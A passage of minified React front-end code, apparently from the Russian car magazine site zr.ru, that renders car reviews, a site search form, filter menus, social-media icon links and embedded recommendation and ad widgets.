              u = i.ratingMinusCounter,
              m = i.ratingPlusCounter,
              p = i.id,
              y = ["— оцените машину", "— Ужасный автомобиль, не советую.", "— Плохой автомобиль, не советую.", "— Средний автомобиль, подумайте перед покупкой.", "— Хороший автомобиль, советую брать.", "— Отличный автомобиль, полный восторг."];
            return o.createElement("div", null, o.createElement(Q, null, o.createElement("h2", null, o.createElement(P, {
              color: "#000",
              href: t.carBrand.href,
              $hideTitle: a
            }, "Отзывы о ", t.carBrand.name, " ", t.name, " ", o.createElement(U, null, "(", t.reviewCount, ")"))), o.createElement(F, null, "number" == typeof g && g > 0 && o.createElement("div", null, K()(5).map(function (e) {
              return e < g ? o.createElement(Y, {
                $red: !0,
                key: e
              }) : o.createElement(Y, {
                key: e
              });
            })), "number" == typeof g && 0 === g && o.createElement("div", null, K()(5).map(function (e) {
              return o.createElement(Y, {
                key: e
              });
            })), o.createElement(J, null, g ? y[g] : y[0])), t && o.createElement(_, null, o.createElement(q, null, t.carBrand.name && o.createElement(n.Z, {
              href: t.carBrand.href,
              color: "#000",
              weight: 700,
              fontSize: 21
            }, t.carBrand.name), " ", t.name && o.createElement(n.Z, {
              weight: 700,
              href: t.href,
              color: "#000",
              fontSize: 21
            }, t.name), " ", l && o.createElement(W, null, " ", l)), o.createElement(G, null, "/"), c && o.createElement(R, null, " срок владения: ", c.name, " ")), s && o.createElement(H, null, o.createElement("p", null, o.createElement(V, null, "Достоинства:")), o.createElement("p", null, s)), M && o.createElement(H, null, o.createElement("p", null, o.createElement(V, null, "Недостатки:")), o.createElement("p", null, M)), d && o.createElement(H, null, o.createElement("p", null, o.createElement(V, null, "Комментарий:")), o.createElement("p", null, d)), o.createElement($, null, o.createElement(k, {
              width: 16,
              height: 16,
              ratingPlus: m,
              ratingMinus: u,
              localPrefix: "review_vote",
              id: p,
              type: "car_review",
              fontSize: 21
            }))));
          }
          return t ? o.createElement("div", null, o.createElement(Q, null, o.createElement("h2", null, o.createElement(P, {
            color: "#000",
            href: t.carBrand.href
          }, "Отзывы о ", t.carBrand.name, " ", t.name)), o.createElement(B, null, "К сожалению, на данный момент отзывов нет. Будь первым!"), o.createElement("h3", null, o.createElement(P, {
            color: "#000",
            href: "".concat(t.href, "reviews/"),
            $hideTitle: a
          }, "Написать отзыв")))) : null;
        }
        var te = i(3989);
        function ie() {
          var e = (0, o.useRef)(null);
          return (0, o.useEffect)(function () {
            var t = e.current;
            if (t) {
              var i = document.createElement("script"),
                n = "c5e4a3d4256265592a3e0c0831ed82bd";
              i.setAttribute("data-key", n), t.appendChild(i), function (e) {
                var t = window;
                if (t._sparrow_widgets || (t._sparrow_widgets = []), t._sparrow_widgets.push({
                  script_key: "c5e4a3d4256265592a3e0c0831ed82bd",
                  settings: {
                    type: "lenta",
                    w: 18088,
                    sid: 10969
                  }
                }), window._SparrowLoader) window._SparrowLoader.initWidgets();else {
                  var i = document.createElement("script");
                  i.type = "text/javascript", i.async = !0, i.src = "//widget.sparrow.ru/js/loader.js", (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(i);
                }
              }();
            }
          }, []), o.createElement("div", {
            ref: e
          });
        }
        function ne() {
          var e = (0, o.useRef)(null);
          return (0, o.useEffect)(function () {
            var t = e.current;
            if (t) {
              var i = document.createElement("script"),
                n = "0fc86fd5750c9f7a35477d4266aab91b";
              i.setAttribute("data-key", n), t.appendChild(i), function (e) {
                var t = window;
                if (t._sparrow_widgets || (t._sparrow_widgets = []), t._sparrow_widgets.push({
                  script_key: "0fc86fd5750c9f7a35477d4266aab91b",
                  settings: {
                    sid: 10969
                  }
                }), window._Sparrow_embed) window._Sparrow_embed.initWidgets();else {
                  var i = document.createElement("script");
                  i.type = "text/javascript", i.async = !0, i.src = "//widget.sparrow.ru/js/embed.js", (document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]).appendChild(i);
                }
              }();
            }
          }, []), o.createElement("div", {
            ref: e
          });
        }
        function re() {
          var e = (0, te.Fs)(),
            t = e.isMobile,
            i = e.isTablet;
          return o.createElement(o.Fragment, null, t || i ? o.createElement(ne, null) : o.createElement(ie, null));
        }
        function ae() {
          var e = (0, o.useRef)(null),
            t = "yWpqbVOSukC6rq6u";
          return (0, o.useEffect)(function () {
            var i = e.current;
            window.relapTasks || (window.relapTasks = []);
            try {
              window.relapTasks.push(function (e) {
                function n() {
                  i.className = "", e.addWidget({
                    cfgId: t,
                    anchorEl: i,
                    events: {
                      onNoContent: function () {
                        i.remove();
                      }
                    }
                  });
                }
                var r, a;
                e.isReady ? n() : e.init({
                  token: "pd2lTspOTxrnnR4b",
                  url: null !== (r = null === (a = window.top) || void 0 === a ? void 0 : a.location.href) && void 0 !== r ? r : "https://www.zr.ru"
                }).then(n);
              });
            } catch (e) {
              console.log("Relap widget with error: ", e);
            }
            if (!document.querySelector(".relap-runtime-iframe")) {
              var n = document.createElement("script");
              n.src = "https://relap.io/v7/relap.js", document.body.appendChild(n);
            }
          }, []), o.createElement("div", {
            ref: e,
            "data-relap-id": t
          });
        }
        var oe = i(405);
        function le() {
          var e = (0, te.Fs)(),
            t = e.isMobile,
            i = e.isTablet,
            n = t || i ? 86023 : 84990;
          return o.createElement(o.Fragment, null, o.createElement("div", {
            id: "unit_".concat(n)
          }), o.createElement(oe.q, null, o.createElement("script", {
            src: "https://smi2.ru/data/js/".concat(n, ".js"),
            async: !0
          })));
        }
        l.ZP.form.withConfig({
          displayName: "styled__CommentsForm",
          componentId: "sc-1p0e0to-0"
        })(["text-align:right;@media (max-width:1024px){display:none;}"]), l.ZP.textarea.withConfig({
          displayName: "styled__CommentField",
          componentId: "sc-1p0e0to-1"
        })(["overflow:auto hidden;box-sizing:border-box;height:88px;padding:16px;width:100%;resize:none;border:1px solid #dadadc;outline:0;border-radius:0.1875rem;font-size:1rem;margin:0;line-height:18px;color:#4e4e4e;&:focus{border-color:#88a92b;min-height:88px;}"]), l.ZP.div.withConfig({
          displayName: "styled__CommentError",
          componentId: "sc-1p0e0to-2"
        })(["margin-left:0;text-align:left;"]), l.ZP.div.withConfig({
          displayName: "styled__ButtonConatiner",
          componentId: "sc-1p0e0to-3"
        })(["text-align:right;"]);
        var ce = i(5129),
          se = l.ZP.div.withConfig({
            displayName: "styled__FilterPanel",
            componentId: "sc-1ldvh7o-0"
          })(["display:inline-block;margin:0 23px 0 0;position:relative;@media (max-width:1024px){display:none;", "}"], (0, L.fq)("$isMobVisible", (0, l.iv)(["display:inline-block;"]))),
          Me = l.ZP.span.withConfig({
            displayName: "styled__FilterButton",
            componentId: "sc-1ldvh7o-1"
          })(['color:#1c88d4;border-bottom:1px dotted rgba(28,136,212,0.3);position:relative;margin-right:20px;background-color:transparent;padding:0;margin:0;font-size:1em;line-height:1.1;outline:0;cursor:pointer;&:after{content:"";position:absolute;left:100%;top:50%;margin-top:-1px;margin-left:5px;width:0;height:0;border-left:3px solid transparent;border-right:3px solid transparent;border-top:4px solid #ababab;}']),
          de = l.ZP.div.withConfig({
            displayName: "styled__FilterPopup",
            componentId: "sc-1ldvh7o-2"
          })(['visibility:hidden;left:0px;top:25px;display:none;position:absolute;background-color:#fff;border-radius:8px;box-shadow:4px 4px 33px rgb(37 39 52 / 30%);z-index:11;white-space:nowrap;outline:0;padding:15px 15px 10px;&:before{left:30px;content:"";background-color:#fff;box-shadow:-6px 1px 11px rgb(37 39 52 / 30%);height:11px;position:absolute;top:-5px;transform:rotate(-135deg);width:11px;}&:after{content:"";position:absolute;top:0;left:0;width:100%;height:15px;background-color:#fff;border-radius:8px;z-index:2;}', ""], (0, L.fq)("$isOpen", (0, l.iv)(["display:block;visibility:visible;"]))),
          ge = l.ZP.ul.withConfig({
            displayName: "styled__FilterList",
            componentId: "sc-1ldvh7o-3"
          })(["margin:0;padding:0;list-style:none;"]),
          ue = l.ZP.li.withConfig({
            displayName: "styled__FilterItem",
            componentId: "sc-1ldvh7o-4"
          })(["margin-bottom:10px;margin-left:0;a{border-bottom:none;}"]),
          me = i(236);
        function pe(e) {
          var t = e.items,
            i = void 0 === t ? [] : t,
            r = e.isMobVisible,
            a = void 0 !== r && r,
            l = (0, o.useState)(!1),
            c = T()(l, 2),
            s = c[0],
            M = c[1],
            d = (0, o.useRef)(null);
          return (0, me.AQ)(function () {
            M(!1);
          }, [d]), o.createElement(se, {
            ref: d,
            $isMobVisible: a
          }, i.map(function (e, t) {
            var i = e.name,
              n = e.selected;
            return o.createElement(o.Fragment, {
              key: t
            }, n && o.createElement(Me, {
              onClick: function () {
                return M(!s);
              }
            }, i));
          }), o.createElement(de, {
            $isOpen: s
          }, o.createElement(ge, null, i.map(function (e, t) {
            var i = e.name,
              r = e.href;
            return o.createElement(ue, {
              key: t
            }, o.createElement(n.Z, {
              color: "#000",
              href: r
            }, i));
          }))));
        }
        var ye = i(4471),
          Ie = l.ZP.form.withConfig({
            displayName: "styled__SearchForm",
            componentId: "sc-106jemj-0"
          })(["margin-left:1.375rem;position:relative;@media (max-width:1024px){margin-left:0px;}"]),
          Ne = l.ZP.input.withConfig({
            displayName: "styled__SearchInput",
            componentId: "sc-106jemj-1"
          })(["outline:0;background:0 0;height:1.8125rem;width:14.875rem;font-size:1rem;border:0.0625rem solid #b5b5b7;border-radius:0.25rem;padding:0 2.1875rem 0 0.4375rem;transition:0.3s;box-sizing:border-box;&:focus{background-color:#eee;}@media (max-width:1024px){overflow:hidden;padding:0.5em 35px 0.5em 0.5em;background-color:transparent;border:1px solid #3d484a;border-radius:6px;color:#3d484a;transition:none;width:100%;height:auto;}"]),
          je = l.ZP.button.withConfig({
            displayName: "styled__SearchButton",
            componentId: "sc-106jemj-2"
          })(["border:none;width:1.3125rem;height:1.3125rem;background:url(", ") no-repeat center center;position:absolute;top:50%;right:0.4375rem;transform:translateY(-50%);@media (max-width:1024px){right:8;}"], ye.Z);
        function he() {
          return o.createElement(Ie, {
            action: "/search/"
          }, o.createElement(Ne, {
            name: "q",
            "aria-label": "Search",
            placeholder: "Поиск по сайту"
          }), o.createElement(je, {
            type: "submit",
            name: "",
            title: "Search"
          }));
        }
        var xe = l.ZP.div.withConfig({
            displayName: "styled__SocialLinks",
            componentId: "sc-1ndt3vj-0"
          })(["display:flex;align-items:center;"]),
          De = l.ZP.a.withConfig({
            displayName: "styled__SocialLink",
            componentId: "sc-1ndt3vj-1"
          })(["transition:0.3s;&:not(:last-child){margin-right:0.3125rem;}&:hover{opacity:0.5;}"]),
          fe = i(568),
          we = i(8386),
          ze = i(7481),
          Te = i(8482),
          Le = i(7788),
          Ee = {
            vk: {
              icon: "".concat(fe.Z),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIyLjgyNjEgMTYuNTU4OEMyMi44MjYxIDE2LjM0NDYgMjIuODE0OCAxNC42MDg3IDIxLjA2NzYgMTQuNjA4N0gxOS4xNzRWMTguMjYwOUMxOS4xNzQgMTguMjYwOSAyMC44NTM0IDE4LjIzODMgMjEuMTM1MyAxOC4yMzgzQzIyLjcwMjEgMTguMjQ5NiAyMi44MjYxIDE2Ljg4NTcgMjIuODI2MSAxNi41NTg4WiIgZmlsbD0iIzNENDg0QSIvPgo8cGF0aCBkPSJNMjIuMDAzMiAyMS45MzU1QzIxLjUwNzIgMjEuOTM1NSAxOS4xNzQgMjEuOTEzIDE5LjE3NCAyMS45MTNWMjcuMzkxMkMxOS4xNzQgMjcuMzkxMiAyMS40NTA5IDI3LjM1NzUgMjEuOTEzMSAyNy4zNTc1QzI0LjI4MDIgMjcuMzU3NSAyNC42NTIyIDI1LjMyODQgMjQuNjUyMiAyNC41OTU4QzI0LjY1MjIgMjMuNDc5OCAyNC4wNTQ4IDIxLjkzNTUgMjIuMDAzMiAyMS45MzU1WiIgZmlsbD0iIzNENDg0QSIvPgo8cGF0aCBkPSJNMjEgMEM5LjQyMzQ5IDAgMCA5LjQyMzUxIDAgMjFDMCAzMi41NzY0IDkuNDIzNDkgNDIgMjEgNDJDMzIuNTc2NSA0MiA0MiAzMi41NzY0IDQyIDIxQzQyIDkuNDIzNTEgMzIuNTc2NSAwIDIxIDBaTTIxLjczMjcgMzEuMDQzNEgxMy42OTU3VjEwLjk1NjVIMjAuNzk3MUMyMi45OTUyIDEwLjk1NjUgMjguMjgxOCAxMS4wMjQxIDI4LjI4MTggMTUuNTU1NUMyOC4yODE4IDE4LjI2MDggMjYuNDMzMSAxOS40NDQ0IDI1LjU5OSAxOS43OTM4VjE5LjkwNjZDMjcuNzc0NSAxOS45MDY2IDMwLjEzMDQgMjIuMTgzNSAzMC4xMzA0IDI0LjY4NTlDMzAuMTMwNCAyNy4zOTEzIDI4Ljk5MiAzMS4wNDM0IDIxLjczMjcgMzEuMDQzNFoiIGZpbGw9IiMzRDQ4NEEiLz4KPC9zdmc+Cg=="),
              href: "https://vk.com/zronline",
              alt: "За рулем в VK"
            },
            fb: {
              icon: "".concat(we.Z),
              darkicon: "",
              href: "https://www.facebook.com/ZRulem",
              alt: "За рулем в Facebook"
            },
            tw: {
              icon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0zMiAxNmExNiAxNiAwIDEgMS0zMiAwIDE2IDE2IDAgMCAxIDMyIDBabS04LjQtMy45Yy43OC0uMSAxLjUxLS4zIDIuMi0uNmE3Ljc2IDcuNzYgMCAwIDEtMS45IDEuOTh2LjQ5YzAgNS4wNi0zLjg0IDEwLjg4LTEwLjg4IDEwLjg4LTIuMTYgMC00LjE3LS42My01Ljg2LTEuNzFhNy41IDcuNSAwIDAgMCAuOTEuMDVjMS44IDAgMy40NC0uNjEgNC43NS0xLjY0YTMuODMgMy44MyAwIDAgMS0zLjU3LTIuNjUgMy44MyAzLjgzIDAgMCAwIDEuNzMtLjA3IDMuODMgMy44MyAwIDAgMS0zLjA3LTMuNzV2LS4wNWMuNTEuMjkgMS4xLjQ2IDEuNzMuNDhhMy44MiAzLjgyIDAgMCAxLTEuMTgtNS4xIDEwLjg2IDEwLjg2IDAgMCAwIDcuODggNCAzLjgyIDMuODIgMCAwIDEgNi41Mi0zLjQ5IDcuNjYgNy42NiAwIDAgMCAyLjQzLS45NGMtLjI5LjktLjkgMS42NS0xLjY5IDIuMTJaIiBmaWxsPSIjQkRCREJEIi8+PC9zdmc+"),
              darkicon: "",
              href: "https://twitter.com/zr_ru",
              alt: "За рулем в Twitter"
            },
            instagram: {
              icon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTIxIDE1YzEgMSAwIDYtNSA2LTQgMC02LTQtNS02SDl2N3MwIDEgMSAxaDEyYzEgMCAxLTEgMS0xdi03aC0yWm0tNSA1YzIgMCA0LTIgNC00cy0yLTQtNC00LTQgMi00IDQgMiA0IDQgNFptNC41LThoMmwuNS0uNXYtMmwtLjUtLjVoLTJsLS41LjV2MmMwIC4zLjIuNS41LjVaTTE2IDBDOCAwIDAgNyAwIDE2czcgMTYgMTYgMTYgMTYtNyAxNi0xNlMyNSAwIDE2IDBabTkgMjNhMiAyIDAgMCAxLTIgMkg5YTIgMiAwIDAgMS0yLTJWOWMwLTEuMS45LTIgMi0yaDE0YTIgMiAwIDAgMSAyIDJ2MTRaIiBmaWxsPSIjQkRCREJEIi8+PC9zdmc+"),
              darkicon: "",
              href: "https://www.instagram.com/zr_ru/",
              alt: "За рулем в Instagram"
            },
            youtube: {
              icon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0ibTE5LjcgMTUuNi01LTIuNWMtLjMtLjItLjcgMC0uNy41djQuOGMwIC41LjQuNy44LjVsNC45LTIuNWMuNC0uMi40LS42IDAtLjhaTTE2IDBhMTYgMTYgMCAxIDAgMCAzMiAxNiAxNiAwIDAgMCAwLTMyWm0wIDIzYy04LjIgMC05LTEuMi05LTdzLjgtNyA5LTcgOSAxLjIgOSA3LS44IDctOSA3WiIgZmlsbD0iI0JEQkRCRCIvPjwvc3ZnPg=="),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTI0LjUwNjYgMjAuNjM0N0wxOS41OTM0IDE4LjM0MjJDMTkuMTY0NyAxOC4xNDMxIDE4LjgxMjUgMTguMzY2MiAxOC44MTI1IDE4Ljg0MDlWMjMuMTU5MUMxOC44MTI1IDIzLjYzMzcgMTkuMTY0NyAyMy44NTY5IDE5LjU5MzQgMjMuNjU3OEwyNC41MDQ0IDIxLjM2NTNDMjQuOTM1MyAyMS4xNjQxIDI0LjkzNTMgMjAuODM1OSAyNC41MDY2IDIwLjYzNDdaTTIxIDBDOS40MDE4NyAwIDAgOS40MDE4NyAwIDIxQzAgMzIuNTk4MSA5LjQwMTg3IDQyIDIxIDQyQzMyLjU5ODEgNDIgNDIgMzIuNTk4MSA0MiAyMUM0MiA5LjQwMTg3IDMyLjU5ODEgMCAyMSAwWk0yMSAyOS41MzEyQzEwLjI1MDYgMjkuNTMxMiAxMC4wNjI1IDI4LjU2MjIgMTAuMDYyNSAyMUMxMC4wNjI1IDEzLjQzNzggMTAuMjUwNiAxMi40Njg3IDIxIDEyLjQ2ODdDMzEuNzQ5NCAxMi40Njg3IDMxLjkzNzUgMTMuNDM3OCAzMS45Mzc1IDIxQzMxLjkzNzUgMjguNTYyMiAzMS43NDk0IDI5LjUzMTIgMjEgMjkuNTMxMloiIGZpbGw9IiMzRDQ4NEEiLz4KPC9zdmc+Cg=="),
              href: "https://www.youtube.com/user/tvzrru",
              alt: "За рулем в Youtube"
            },
            rss: {
              icon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNiAzMmExNiAxNiAwIDEgMCAwLTMyIDE2IDE2IDAgMCAwIDAgMzJabS01LTEzYzEgMCAyIDEgMiAycy0xIDItMiAyLTItMS0yLTIgMS0yIDItMlptLTItNmM1LjgyIDAgMTAgNC4xNyAxMCAxMGgtM2MwLTItLjMtMy45LTEuNy01LjNDMTIuODcgMTYuMjggMTEgMTYgOSAxNnYtM1ptMC02YzguODIgMCAxNiA3LjE4IDE2IDE2aC0zLjA4YzAtNy4xMy01LjgtMTIuOTMtMTIuOTItMTIuOTNWN1oiIGZpbGw9IiNDNEM0QzQiLz48L3N2Zz4="),
              darkicon: "",
              href: "https://www.zr.ru/rss-yandex/",
              alt: "За рулем"
            },
            zen: {
              icon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzYiIGhlaWdodD0iMzYiIHZpZXdCb3g9IjAgMCAzNiAzNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0wIDE4QzAgOC4wNTg3NSA4LjA1ODc1IDAgMTggMEMyNy45NDEyIDAgMzYgOC4wNTg3NSAzNiAxOEMzNiAyNy45NDEyIDI3Ljk0MTIgMzYgMTggMzZDOC4wNTg3NSAzNiAwIDI3Ljk0MTIgMCAxOFpNMTAuMzAxIDEwLjMwMTJDMTEuNjIwNSA5LjAxMjY4IDE0LjE5MSA5LjAwMDM0IDE3LjkwMDggOC45OTk5OUMxNy43ODA1IDEyLjk4NTQgMTcuNjgwNyAxNC44MDc4IDE2LjI2MTQgMTYuMjYxM0MxNC44MDc5IDE3LjY4MDcgMTIuOTg1NSAxNy43ODA1IDkuMDAwMjMgMTcuOTAwN0M5LjAwMDIzIDE0LjMxMTcgOS4wMTI1NyAxMS42MjA0IDEwLjMwMSAxMC4zMDEyWk05IDE4LjA5OTZDOSAyMS42ODg3IDkuMDEyMzQgMjQuMzc5OSAxMC4zMDA4IDI1LjY5OTFDMTEuNjIwMyAyNi45ODggMTQuMTkwOCAyNyAxNy45MDA1IDI3QzE3Ljc4MDMgMjMuMDE0OSAxNy42ODA0IDIxLjE5MjUgMTYuMjYxMiAxOS43MzlDMTQuODA3NyAxOC4zMTk2IDEyLjk4NTIgMTguMjE5OCA5IDE4LjA5OTZaTTE5LjczODkgMTkuNzM5QzE4LjMxOTYgMjEuMTkyNSAxOC4yMTk3IDIzLjAxNDkgMTguMDk5NSAyN0MyMS44MDkyIDI3IDI0LjM3OTQgMjYuOTg4IDI1LjY5ODkgMjUuNjk5MUMyNi45ODczIDI0LjM3OTkgMjYuOTk5NiAyMS42ODg3IDI3IDE4LjA5OTZDMjMuMDE0OCAxOC4yMTk4IDIxLjE5MjMgMTguMzE5NiAxOS43Mzg5IDE5LjczOVpNMTkuNzM4OSAxNi4yNjEzQzE4LjMxOTYgMTQuODA3OCAxOC4yMTk3IDEyLjk4NTQgMTguMDk5NSA4Ljk5OTk5QzIxLjgwOTIgOS4wMDAzNCAyNC4zNzk0IDkuMDEyNjggMjUuNjk4OSAxMC4zMDEyQzI2Ljk4NzMgMTEuNjIwNCAyNi45OTk2IDE0LjMxMTcgMjcgMTcuOTAwN0MyMy4wMTQ4IDE3Ljc4MDUgMjEuMTkyMyAxNy42ODA3IDE5LjczODkgMTYuMjYxM1oiIGZpbGw9IiNCREJEQkQiLz4KPC9zdmc+Cg=="),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0wIDIxQzAgOS40MDE4NyA5LjQwMTg3IDAgMjEgMEMzMi41OTgxIDAgNDIgOS40MDE4NyA0MiAyMUM0MiAzMi41OTgxIDMyLjU5ODEgNDIgMjEgNDJDOS40MDE4NyA0MiAwIDMyLjU5ODEgMCAyMVpNMTIuMDE3OCAxMi4wMTgxQzEzLjU1NzIgMTAuNTE0OCAxNi41NTYyIDEwLjUwMDQgMjAuODg0MiAxMC41QzIwLjc0MzkgMTUuMTQ5NyAyMC42Mjc0IDE3LjI3NTggMTguOTcxNiAxOC45NzE2QzE3LjI3NTkgMjAuNjI3NSAxNS4xNDk3IDIwLjc0MzkgMTAuNTAwMyAyMC44ODQyQzEwLjUwMDMgMTYuNjk2OSAxMC41MTQ3IDEzLjU1NzEgMTIuMDE3OCAxMi4wMTgxWk0xMC41IDIxLjExNjJDMTAuNSAyNS4zMDM0IDEwLjUxNDQgMjguNDQzMiAxMi4wMTc2IDI5Ljk4MjNDMTMuNTU3IDMxLjQ4NiAxNi41NTU5IDMxLjUgMjAuODgzOSAzMS41QzIwLjc0MzYgMjYuODUwNyAyMC42MjcyIDI0LjcyNDYgMTguOTcxNCAyMy4wMjg4QzE3LjI3NTYgMjEuMzcyOSAxNS4xNDk0IDIxLjI1NjUgMTAuNSAyMS4xMTYyWk0yMy4wMjg3IDIzLjAyODhDMjEuMzcyOCAyNC43MjQ2IDIxLjI1NjMgMjYuODUwNyAyMS4xMTYgMzEuNUMyNS40NDQxIDMxLjUgMjguNDQyNiAzMS40ODYgMjkuOTgyIDI5Ljk4MjNDMzEuNDg1MiAyOC40NDMyIDMxLjQ5OTYgMjUuMzAzNCAzMS41IDIxLjExNjJDMjYuODUwNSAyMS4yNTY1IDI0LjcyNDQgMjEuMzcyOSAyMy4wMjg3IDIzLjAyODhaTTIzLjAyODcgMTguOTcxNkMyMS4zNzI4IDE3LjI3NTggMjEuMjU2MyAxNS4xNDk3IDIxLjExNiAxMC41QzI1LjQ0NDEgMTAuNTAwNCAyOC40NDI2IDEwLjUxNDggMjkuOTgyIDEyLjAxODFDMzEuNDg1MiAxMy41NTcxIDMxLjQ5OTYgMTYuNjk2OSAzMS41IDIwLjg4NDJDMjYuODUwNSAyMC43NDM5IDI0LjcyNDQgMjAuNjI3NSAyMy4wMjg3IDE4Ljk3MTZaIiBmaWxsPSIjM0Q0ODRBIi8+Cjwvc3ZnPgo="),
              href: "https://zen.yandex.ru/zr.ru",
              alt: "За рулем в Яндекс Дзен"
            },
            tg: {
              icon: "".concat(ze.Z),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDIiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MiA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0wIDIxQzAgMTUuNDMwNSAyLjIxMjQ5IDEwLjA4OSA2LjE1MDc2IDYuMTUwNzZDMTAuMDg5IDIuMjEyNDkgMTUuNDMwNSAwIDIxIDBDMjYuNTY5NSAwIDMxLjkxMSAyLjIxMjQ5IDM1Ljg0OTIgNi4xNTA3NkMzOS43ODc1IDEwLjA4OSA0MiAxNS40MzA1IDQyIDIxQzQyIDI2LjU2OTUgMzkuNzg3NSAzMS45MTEgMzUuODQ5MiAzNS44NDkyQzMxLjkxMSAzOS43ODc1IDI2LjU2OTUgNDIgMjEgNDJDMTUuNDMwNSA0MiAxMC4wODkgMzkuNzg3NSA2LjE1MDc2IDM1Ljg0OTJDMi4yMTI0OSAzMS45MTEgMCAyNi41Njk1IDAgMjFaTTMyLjE1NjIgOC42NjI1SDMyLjAyNUMyNy43Mjg4IDEwLjM5MTIgMjMuNDQxMyAxMi4xNDEyIDE5LjE2MjUgMTMuOTEyNUwxNy40NTYzIDE0LjdMMy41NDM3NSAyMC40NzVMMTEuMTU2MiAyMy4xTDI3LjMgMTMuMjU2M0MyNy4zIDEzLjI1NjMgMjguMDg3NSAxMi44NjI1IDI4LjA4NzUgMTMuMzg3NUMyOC4wODc1IDEzLjM4NzUgMjguMjE4OCAxMy41MTg4IDI3LjY5MzggMTQuMDQzN0wxNC45NjI1IDI1Ljg1NjNMMTMuOTEyNSAzMi4wMjVMMTguNjM3NSAyNy44MjVMMjYuNTEyNSAzMy43MzEzQzI2LjkwNjIgMzMuODYyNSAyNy4wMzc1IDMzLjczMTMgMjcuMDM3NSAzMy43MzEzTDI3LjE2ODggMzMuNkwzMi4xNTYyIDguNzkzNzVWOC42NjI1WiIgZmlsbD0iIzNENDg0QSIvPgo8L3N2Zz4K"),
              href: "https://t.me/zr_ru",
              alt: "За рулем в Телеграмм"
            },
            ok: {
              icon: "".concat(Te.Z),
              darkicon: "".concat("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDMiIGhlaWdodD0iNDIiIHZpZXdCb3g9IjAgMCA0MyA0MiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTIxLjM3NSAwQzkuNzk1NzggMCAwLjM3NSA5LjQyMDc4IDAuMzc1IDIxQzAuMzc1IDMyLjU3OTIgOS43OTU3OCA0MiAyMS4zNzUgNDJDMzIuOTU0MiA0MiA0Mi4zNzUgMzIuNTc5MiA0Mi4zNzUgMjFDNDIuMzc1IDkuNDIwNzggMzIuOTU0MiAwIDIxLjM3NSAwWk0yMS4zNzUgNy4zMDQzNUMyNC45MDQ4IDcuMzA0MzUgMjcuNzY2MyAxMC4xNjU4IDI3Ljc2NjMgMTMuNjk1N0MyNy43NjYzIDE3LjIyNTUgMjQuOTA0OCAyMC4wODcgMjEuMzc1IDIwLjA4N0MxNy44NDUyIDIwLjA4NyAxNC45ODM3IDE3LjIyNTUgMTQuOTgzNyAxMy42OTU3QzE0Ljk4MzcgMTAuMTY1OCAxNy44NDUyIDcuMzA0MzUgMjEuMzc1IDcuMzA0MzVaTTIxLjM3NSAxMC45NTY1QzIwLjY0ODUgMTAuOTU2NSAxOS45NTE4IDExLjI0NTEgMTkuNDM4MSAxMS43NTg4QzE4LjkyNDUgMTIuMjcyNSAxOC42MzU5IDEyLjk2OTIgMTguNjM1OSAxMy42OTU3QzE4LjYzNTkgMTQuNDIyMSAxOC45MjQ1IDE1LjExODggMTkuNDM4MSAxNS42MzI1QzE5Ljk1MTggMTYuMTQ2MiAyMC42NDg1IDE2LjQzNDggMjEuMzc1IDE2LjQzNDhDMjIuMTAxNSAxNi40MzQ4IDIyLjc5ODIgMTYuMTQ2MiAyMy4zMTE5IDE1LjYzMjVDMjMuODI1NSAxNS4xMTg4I